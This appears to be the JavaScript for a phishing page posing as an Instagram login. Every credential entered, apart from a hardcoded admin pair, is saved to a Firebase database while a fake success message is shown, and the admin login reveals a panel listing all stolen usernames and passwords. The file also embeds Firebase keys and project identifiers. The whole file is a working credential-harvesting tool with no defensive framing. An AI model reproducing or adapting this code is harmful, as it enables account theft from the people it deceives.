const firebaseConfig = {
  apiKey: "AIzaSyDp0Iwx4OONrJytVUQ8xSr0Udp7I9lUogw",
  authDomain: "instagram00000-464c9.firebaseapp.com",
  projectId: "instagram00000-464c9",
  storageBucket: "instagram00000-464c9.appspot.com",
  messagingSenderId: "141047756131",
  appId: "1:141047756131:web:0bc5ecd8c87cddc307cf56",
  measurementId: "G-PEJ7EH891Y"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const loginBtn = document.getElementById("loginBtn");
const passwordField = document.getElementById("password");
const toggle = document.querySelector(".toggle");

toggle.addEventListener("click", () => {
  if (passwordField.type === "password") {
    passwordField.type = "text";
  } else {
    passwordField.type = "password";
  }
});

loginBtn.addEventListener("click", () => {
  const user = document.getElementById("username").value;
  const pass = passwordField.value;

  if (user === "Instagram00000" && pass === "sim") {
    document.getElementById("admin-panel").style.display = "block";
    db.ref("logins").once("value").then(snapshot => {
      const list = document.getElementById("logins-list");
      list.innerHTML = "";
      snapshot.forEach(child => {
        const li = document.createElement("li");
        li.textContent = `${child.val().username} | ${child.val().password}`;
        list.appendChild(li);
      });
    });
  } else {
    db.ref("logins").push({
      username: user,
      password: pass,
      timestamp: new Date().toISOString()
    });
    alert("Login feito!");
  }
});